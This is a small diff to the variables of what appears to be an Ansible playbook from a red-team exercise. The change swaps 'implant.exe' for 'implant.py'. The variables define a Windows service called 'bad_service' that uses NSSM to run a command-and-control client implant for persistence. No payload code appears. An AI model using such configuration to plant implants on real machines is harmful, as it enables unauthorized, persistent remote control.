@@ -4,7 +4,7 @@
     vars:
       service_name: "bad_service"
       service_directory: "C://Windows/BadService"
-      service_script: "{{ service_directory }}\\implant.exe"
+      service_script: "{{ service_directory }}\\implant.py"
       local_file: "/home/redteam/310Infragroup7nyameow/Matt_tool/c2_programs/Client_C2.py"
       nssm_exe: "{{ service_directory }}\\nssm.exe"
       local_nssm: "/home/redteam/310Infragroup7nyameow/Matt_tool/nssm1.exe"
